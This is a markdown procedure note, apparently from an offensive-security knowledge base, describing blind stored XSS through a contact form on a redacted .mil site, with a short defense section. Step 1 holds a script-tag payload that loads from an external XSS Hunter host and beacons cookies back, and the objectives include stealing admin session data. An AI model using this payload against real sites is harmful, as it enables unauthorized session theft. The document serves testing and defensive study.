---
tags:
  - xss
  - stored-xss
  - blind-xss
  - injection
type: procedure
tools:
  - '[[tools/XSS-Hunter]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:47:13.076Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 91ef26a1-8952-45ff-a0b4-678251e0c859
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Inject-Blind-Stored-XSS-Payload-into-Contact-Form

## Summary

This procedure involves submitting a blind stored XSS payload through a vulnerable contact form on a web application, exploiting improper input sanitization to store executable JavaScript in the backend, which can later be triggered to exfiltrate data when viewed by privileged users like administrators.

## Description

In this attack scenario, the target is a public-facing contact form on a U.S. Department of Defense website (https://██████.mil/) where fields such as First name, Last name, Company, and Description lack proper HTML encoding or sanitization, allowing injection of angle brackets and script tags. The attacker crafts a payload using an external service like XSS Hunter to detect execution blindly, as no immediate feedback is visible. Once stored, the payload executes in the context of an admin viewing the submission in the /admin panel, leading to data leakage. Prerequisites include public access to the form and an XSS detection service account. Expected outcomes are payload storage and eventual exfiltration of admin session data.

## Requirements

1. Web browser with developer tools for payload testing
2. Public access to the target contact form URL
3. Account on an XSS Hunter service to generate and monitor payloads
4. Basic knowledge of JavaScript and HTML injection techniques

## Defense

Defensive measures and detection strategies:

- Implement strict input sanitization and HTML encoding on all form fields using libraries like DOMPurify
- Use Content Security Policy (CSP) to block inline scripts and external callbacks
- Monitor admin panel logs for anomalous JavaScript execution or outbound requests to unknown domains
- Employ Web Application Firewalls (WAF) to detect and block common XSS payloads

## Objectives

1. Inject and store a malicious JavaScript payload in the backend database via the contact form
2. Ensure the payload remains dormant until triggered by admin interaction
3. Prepare for data exfiltration upon execution to capture sensitive admin information

## Instructions

### Step 1: Generate XSS Payload

**Context**: Create a blind XSS payload using XSS Hunter to include a callback script that reports execution details without visible effects on the form.

No command executed; use the XSS Hunter dashboard to generate a payload like `<script src="https://xsshunter.com/payload?id=unique-id"></script>`.

> This payload loads an external script that beacons back to the service upon execution, capturing context like cookies and IP.

### Step 2: Submit Payload via Contact Form

**Context**: Fill and submit the form fields with the payload to exploit the sanitization flaw.

No command executed; manually enter the payload into First name, Last name, Company, and Description fields on https://██████.mil/contact, then submit.

> The form processes the input without escaping angle brackets, storing the raw HTML/JS in the backend. Success is indicated by a confirmation message without errors.

### Step 3: Verify Storage (Optional Blind Check)

**Context**: If possible, submit a non-malicious test form and check for inconsistencies, but rely on later detection for confirmation.

No command executed; monitor server responses or use network inspection to ensure no sanitization occurs.

> Expected: Payload stored intact, no immediate execution.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/XSS-Hunter]]

## Tags

- [[xss]]
- [[stored-xss]]
- [[blind-xss]]
